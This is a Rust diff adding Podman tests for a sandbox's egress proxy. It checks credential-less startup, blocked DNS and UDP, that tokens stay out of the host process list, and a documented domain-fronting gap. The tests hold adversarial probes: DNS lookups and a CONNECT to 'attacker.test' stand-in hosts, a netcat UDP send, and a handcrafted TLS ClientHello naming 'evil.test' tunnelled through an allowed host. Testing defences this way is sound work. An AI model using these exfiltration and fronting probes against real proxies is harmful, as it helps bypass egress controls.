@@ -85,6 +85,8 @@ struct FakeAuthority {
     allowed: Vec<(String, u16)>,
     state: Mutex<FakeState>,
     this: Weak<FakeAuthority>,
+    /// Refuse every grant, as a decision point whose record is full does.
+    refuse_grants: std::sync::atomic::AtomicBool,
 }
 
 struct Unbind {
@@ -117,6 +119,7 @@ impl FakeAuthority {
             allowed,
             state: Mutex::new(FakeState::default()),
             this: this.clone(),
+            refuse_grants: std::sync::atomic::AtomicBool::new(false),
         })
     }
 
@@ -132,6 +135,9 @@ impl FakeAuthority {
 #[async_trait::async_trait]
 impl EgressAuthority for FakeAuthority {
     async fn grant(&self, spec: GrantSpec) -> Result<EgressGrant, String> {
+        if self.refuse_grants.load(std::sync::atomic::Ordering::SeqCst) {
+            return Err("recording the egress binding failed: Full".into());
+        }
         let token = format!("axe_{}", uuid::Uuid::new_v4().simple());
         let hash = credential_hash(&token);
         let tag = credential_tag(&hash);
@@ -1292,6 +1298,259 @@ async fn a_sidecar_that_keeps_failing_stays_down_once_its_restart_budget_is_spen
             "{:?}",
             fixture.authority.events()
         );
+    })
+    .await;
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+#[ignore = "requires Podman: CONTAINER_CONNECTION=axocoatl-ci-pr74 cargo test -p axocoatl-isolation --test egress_podman -- --ignored --test-threads=1"]
+async fn without_a_credential_setup_provisioning_and_terminals_still_run() {
+    with_fixture("j", |fixture| async move {
+        // A decision point whose record is full grants nothing. Setup and
+        // terminals go ahead without a credential, and the proxy refuses
+        // their connections; they no longer fail or remove the sandbox.
+        fixture
+            .authority
+            .refuse_grants
+            .store(true, std::sync::atomic::Ordering::SeqCst);
+        let session = format!("egress-test-{}", uuid::Uuid::new_v4().simple());
+        fixture.sessions.lock().unwrap().push(session.clone());
+        let workspace = fixture.root.child(&session).unwrap();
+        let sandbox = Arc::new(
+            SessionSandbox::start(
+                &session,
+                workspace.path(),
+                Some(&image("AXO_EGRESS_TEST_IMAGE", ROOT_IMAGE)),
+                &[],
+                &["wget -q -O /tmp/from-setup http://upstream.test:8000/setup 2>/tmp/setup-error || echo refused > /tmp/setup-result".to_string()],
+                &SandboxPolicy {
+                    allow_post_create: true,
+                    ..fixture.policy()
+                },
+            )
+            .await
+            .expect("setup runs without a credential"),
+        );
+        fixture.sandboxes.lock().unwrap().push(sandbox.clone());
+        let container = format!("axo-ses-{session}");
+        // Without an env file the command has no proxy variables either, so
+        // it finds no resolver and no route.
+        let (_, result) = exec(&container, None, None, "cat /tmp/setup-result /tmp/setup-error").await;
+        assert!(result.starts_with("refused"), "{result}");
+        let terminal = Sandbox::spawn_terminal(sandbox.as_ref(), "sh", 24, 120)
+            .await
+            .expect("a terminal opens without a credential");
+        assert_eq!(terminal.egress_token_tag(), None);
+        assert!(Sandbox::kill_terminal(sandbox.as_ref(), &terminal.id));
+        let events = fixture.authority.events();
+        assert!(!events.iter().any(|event| matches!(event, Event::Bind { .. })), "{events:?}");
+        // A process that still finds the proxy gets nothing without a credential.
+        let tokenless = raw(&container, "CONNECT upstream.test:8000 HTTP/1.1\\r\\n\\r\\n").await;
+        assert!(tokenless.starts_with("HTTP/1.1 407"), "{tokenless}");
+
+        // Provisioning also runs; its download is refused, and the start
+        // fails with the egress explanation, not a grant error.
+        let session = format!("egress-test-{}", uuid::Uuid::new_v4().simple());
+        fixture.sessions.lock().unwrap().push(session.clone());
+        let workspace = fixture.root.child(&session).unwrap();
+        let error = SessionSandbox::start(
+            &session,
+            workspace.path(),
+            Some("docker.io/library/alpine:3.20"),
+            &[],
+            &[],
+            &fixture.policy(),
+        )
+        .await
+        .err()
+        .expect("provisioning cannot download without a credential")
+        .to_string();
+        assert!(!error.contains("granting"), "{error}");
+        assert!(error.contains("Under network: egress, provisioning reaches only"), "{error}");
+    })
+    .await;
+}
+
+/// A minimal TLS ClientHello that names `server_name`.
+fn client_hello(server_name: &str) -> Vec<u8> {
+    let name = server_name.as_bytes();
+    let list = 3 + name.len();
+    let mut extension = vec![0x00, 0x00];
+    extension.extend_from_slice(&((list + 2) as u16).to_be_bytes());
+    extension.extend_from_slice(&(list as u16).to_be_bytes());
+    extension.push(0x00);
+    extension.extend_from_slice(&(name.len() as u16).to_be_bytes());
+    extension.extend_from_slice(name);
+    let mut body = vec![0x03, 0x03];
+    body.extend_from_slice(&[7u8; 32]);
+    body.push(0);
+    body.extend_from_slice(&[0x00, 0x02, 0x13, 0x01, 0x01, 0x00]);
+    body.extend_from_slice(&(extension.len() as u16).to_be_bytes());
+    body.extend_from_slice(&extension);
+    let mut handshake = vec![0x01];
+    handshake.extend_from_slice(&(body.len() as u32).to_be_bytes()[1..]);
+    handshake.extend_from_slice(&body);
+    let mut record = vec![0x16, 0x03, 0x01];
+    record.extend_from_slice(&(handshake.len() as u16).to_be_bytes());
+    record.extend_from_slice(&handshake);
+    record
+}
+
+/// SPEC adversarial cases 1, 4, 7 and 11: no name resolution and no UDP
+/// inside the container, no credential in the host's process list during a
+/// tool call, and the domain-fronting residual.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+#[ignore = "requires Podman: CONTAINER_CONNECTION=axocoatl-ci-pr74 cargo test -p axocoatl-isolation --test egress_podman -- --ignored --test-threads=1"]
+async fn names_udp_host_argv_and_the_fronting_residual() {
+    with_fixture("k", |fixture| async move {
+        let (session, sandbox) = fixture.start(&image("AXO_EGRESS_TEST_IMAGE", ROOT_IMAGE), &[]).await;
+        let container = format!("axo-ses-{session}");
+        let (grant, token) = fixture.grant().await;
+        let env = grant.env_file.clone().unwrap();
+
+        // 1. Nothing resolves inside the container, not through the image's
+        // resolver and not through a public server (the curated image has no
+        // `dig`; busybox nslookup with an explicit server is the same query).
+        let (code, output) = exec(&container, None, None, "getent hosts x.attacker.test").await;
+        assert_ne!(code, 0, "{output}");
+        let (code, output) =
+            exec(&container, None, None, "nslookup x.attacker.test 1.1.1.1 2>&1").await;
+        assert_ne!(code, 0, "{output}");
+        assert!(output.contains("unreachable"), "{output}");
+        let refused = raw(
+            &container,
+            &format!(
+                "CONNECT data.attacker.test:443 HTTP/1.1\\r\\nProxy-Authorization: Basic {}\\r\\n\\r\\n",
+                basic(&token)
+            ),
+        )
+        .await;
+        assert!(refused.starts_with("HTTP/1.1 403"), "{refused}");
+        assert!(refused.contains("reason=not_allowed"), "{refused}");
+
+        // 4. A UDP datagram to a public resolver has no route (the query
+        // above is UDP too; this one goes to 8.8.8.8:53 directly).
+        let (code, output) = exec(&container, None, None, "nslookup example.com 8.8.8.8 2>&1; echo x | nc -u -w1 8.8.8.8 53 2>&1").await;
+        assert_ne!(code, 0, "{output}");
+        assert!(output.contains("Network unreachable"), "{output}");
+        let (code, output) = exec(&container, None, None, "ping -c1 -W1 8.8.8.8 2>&1").await;
+        assert_ne!(code, 0, "{output}");
+        assert!(output.contains("sendto: Network unreachable"), "{output}");
+
+        // 7. While a supervised tool call runs with the credential, the
+        // host's process list does not show it.
+        let request = ExecRequest {
+            protocol: PROTOCOL_VERSION,
+            stdin: None,
+            invocation_id: "egress-argv:0".into(),
+            argv: vec!["sh".into(), "-c".into(), "sleep 3".into()],
+            timeout_ms: 20_000,
+            stdout_bytes: 4096,
+            stderr_bytes: 4096,
+            write_restriction: None,
+        };
+        let prepared = Sandbox::prepare_supervised_command_with_env(
+            sandbox.as_ref(),
+            request,
+            None,
+            ProcessEnv {
+                env_file: Some(&env),
+            },
+        )
+        .await
+        .unwrap();
+        let running = prepared.dispatch().unwrap();
+        tokio::time::sleep(Duration::from_millis(1000)).await;
+        let listing = tokio::process::Command::new("ps")
+            .args(["-A", "-ww", "-o", "args="])
+            .output()
+            .await
+            .unwrap();
+        let listing = String::from_utf8_lossy(&listing.stdout).into_owned();
+        assert!(listing.contains("podman"), "the tool call is not running yet");
+        assert!(!listing.contains(&token), "the credential is in a host process's argv");
+        assert!(!listing.contains("axe_"), "a credential is in a host process's argv");
+        running.finish().await.unwrap();
+
+        // 11. Domain fronting is not detected: a tunnel to an allowed host
+        // carries a TLS ClientHello that names another host. This pins the
+        // documented residual; it must not assert a block.
+        use base64::Engine;
+        let hello = base64::engine::general_purpose::STANDARD.encode(client_hello("evil.test"));
+        let (_, fronted) = exec(
+            &container,
+            None,
+            None,
+            &format!(
+                "{{ printf 'CONNECT upstream.test:8000 HTTP/1.1\\r\\nProxy-Authorization: Basic {}\\r\\n\\r\\n'; sleep 1; echo {hello} | base64 -d; sleep 2; }} | nc 127.0.0.1 3128",
+                basic(&token)
+            ),
+        )
+        .await;
+        assert!(fronted.starts_with("HTTP/1.1 200 Connection Established"), "{fronted}");
+        // The upstream received the bytes and answered them.
+        assert!(fronted.contains("400 Bad Request"), "{fronted}");
+        tokio::time::sleep(Duration::from_millis(500)).await;
+        let events = fixture.authority.events();
+        let fronted_open = events.iter().rev().find_map(|event| match event {
+            Event::Open { host, port: 8000, status, .. } if host == "upstream.test" => Some(*status),
+            _ => None,
+        });
+        assert_eq!(fronted_open, Some(None), "{events:?}");
+        assert!(!events.iter().any(|event| matches!(event, Event::Open { host, .. } if host == "evil.test")));
+        drop(grant);
+    })
+    .await;
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+#[ignore = "requires Podman: CONTAINER_CONNECTION=axocoatl-ci-pr74 cargo test -p axocoatl-isolation --test egress_podman -- --ignored --test-threads=1"]
+async fn the_bridge_mode_forwarder_runs_as_the_image_user() {
+    with_fixture("l", |fixture| async move {
+        let session = format!("egress-test-{}", uuid::Uuid::new_v4().simple());
+        fixture.sessions.lock().unwrap().push(session.clone());
+        let workspace = fixture.root.child(&session).unwrap();
+        std::fs::set_permissions(
+            workspace.path(),
+            std::os::unix::fs::PermissionsExt::from_mode(0o777),
+        )
+        .unwrap();
+        let identity = uuid::Uuid::new_v4().simple().to_string();
+        let policy = SandboxPolicy {
+            allow_untrusted_image: true,
+            network: SandboxNetwork::Bridge,
+            service_sockets: true,
+            runtime_authority: Some(format!("{:x}", Sha256::digest(identity.as_bytes()))),
+            supervisor_installation: Some(fixture.installation.clone()),
+            ..SandboxPolicy::default()
+        };
+        let sandbox = Arc::new(
+            SessionSandbox::start(
+                &session,
+                workspace.path(),
+                Some(&image("AXO_EGRESS_TEST_NONROOT_IMAGE", NONROOT_IMAGE)),
+                &[3000],
+                &[],
+                &policy,
+            )
+            .await
+            .unwrap(),
+        );
+        fixture.sandboxes.lock().unwrap().push(sandbox.clone());
+        let container = format!("axo-ses-{session}");
+        Sandbox::ensure_service_sockets(sandbox.as_ref()).await.unwrap();
+        // The socket is created connectable by everyone and belongs to the
+        // image user, and the forwarder runs as that user, not as root.
+        let (_, socket) = exec(&container, None, None, "stat -c '%u %a %F' /run/axocoatl-svc/3000.sock").await;
+        assert_eq!(socket.trim(), "1024 666 socket", "{socket}");
+        let (_, users) = exec(
+            &container,
+            None,
+            None,
+            "for p in /proc/[0-9]*; do if tr '\\0' ' ' < $p/cmdline 2>/dev/null | grep -q '^/axocoatl-exec-supervisor --bridge --unix-to-tcp'; then awk '/^Uid:/{print $2}' $p/status; fi; done",
+        )
+        .await;
+        assert_eq!(users.trim(), "1024", "{users}");
     })
     .await;
 }
